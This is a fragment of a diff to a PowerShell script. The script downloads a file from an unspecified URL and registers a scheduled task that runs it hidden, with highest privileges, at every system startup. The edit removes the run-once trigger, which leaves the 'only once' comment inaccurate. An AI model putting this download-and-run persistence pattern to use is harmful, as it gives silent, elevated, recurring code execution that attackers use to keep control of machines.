@@ -7,5 +7,5 @@ Invoke-WebRequest -Uri $url -OutFile $scriptPath
 # Set the script to run at startup only once
 $taskName = "RunOnceScript"
 $action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoProfile -WindowStyle Hidden -File `"$scriptPath`""
-$trigger = New-ScheduledTaskTrigger -AtStartup -Once
+$trigger = New-ScheduledTaskTrigger -AtStartup
 Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -RunLevel Highest
